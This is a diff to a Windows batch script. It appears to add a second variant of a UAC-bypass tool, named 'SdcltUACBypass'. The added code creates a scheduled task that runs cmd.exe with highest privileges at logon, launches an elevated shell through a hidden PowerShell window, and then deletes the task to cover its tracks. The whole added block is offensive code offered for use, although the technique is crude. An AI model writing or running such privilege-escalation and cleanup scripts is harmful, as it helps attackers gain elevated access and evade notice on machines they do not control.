@@ -80,3 +80,23 @@ timeout /t 3 /nobreak >nul
 schtasks /delete /tn "%taskname%" /f
 
 endlocal
+
+------------------------------------------#
+
+@echo off
+
+setlocal
+set "taskname=SdcltUACBypass"
+set "program=C:\Windows\System32\cmd.exe"
+
+REM Create a scheduled task to run the program with highest privileges
+schtasks /create /tn "%taskname%" /tr "%program%" /rl highest /f /sc onlogon
+
+REM Run the scheduled task in a hidden window using PowerShell
+powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs"
+
+REM Optional: Cleanup the scheduled task after execution
+timeout /t 3 /nobreak >nul
+schtasks /delete /tn "%taskname%" /f
+
+endlocal
